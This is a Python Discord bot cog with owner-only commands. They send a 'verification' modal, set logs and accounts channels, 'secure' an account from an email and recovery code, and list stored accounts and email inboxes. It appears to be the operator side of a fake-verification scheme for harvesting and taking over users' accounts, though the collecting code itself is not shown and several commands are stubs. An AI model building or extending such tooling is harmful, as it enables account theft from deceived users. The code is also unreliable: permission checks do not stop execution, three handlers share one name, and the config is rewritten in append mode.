import json
import discord

from discord import app_commands
from discord.ext import commands

from views.modals.modal_three import MyModalThree

config = json.load(open("config.json", "r+"))
owners = config["owners"]

class MyCog(commands.Cog):
    def __init__(self,  bot):
        self.bot = bot

    @app_commands.command(name="send_embed", description="Sends the verification embed")
    async def verificationEmbed(self, interaction: discord.Interaction):
        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        if config["discord"]["logs_channel"] == "" or config["discord"]["accounts_channel"] == "":
            await interaction.response.send_message("You must set the Logs and Accounts Channel First! Do /set_channel for both.")
            return
        
        await interaction.response.send_modal(MyModalThree())

    @app_commands.command(name="set_channel", description="Sets your channel ID to where the logs will be saved")
    @app_commands.describe(channel_id="The channel ID to use")
    @app_commands.choices(
        choice=[
            app_commands.Choice(name="Logs", value="logs_channel"),
            app_commands.Choice(name="Account", value="accounts_channel"),
        ]
    )
    async def setChannels(self, interaction: discord.Interaction, choice: app_commands.Choice[str], channel_id: str):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        with open("config.json", "r") as f:
            config = json.load(f)

        match choice:
            case "logs_channel":
                config["discord"]["logs_channel"] = int(channel_id)
            case "accounts_channel":
                config["discord"]["accounts_channel"] = int(channel_id)

        with open("config.json", "a+") as nconfig:
            json.dump(config, nconfig, indent = 4)

        await interaction.response.send_message(f"Sucessfully set {choice}!", ephemeral=True)

    @app_commands.command(name="secure", description="Automaticly secures your account")
    async def secure(self, interaction: discord.Interaction, email: str, recoveryCode: str):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.send_message(f"**This command is still in progress.**", ephemeral=True)

    @app_commands.command(name="account", description="Shows you all stored accounts")
    async def secure(self, interaction: discord.Interaction):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.send_message(f"**This command is still in progress.**", ephemeral=True)

    @app_commands.command(name="email", description="Shows the inbox of your email stored in donarev")
    async def secure(self, interaction: discord.Interaction, email: str):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.send_message(f"**This command is still in progress.**", ephemeral=True)

async def setup(bot):
    await bot.add_cog(MyCog(bot))
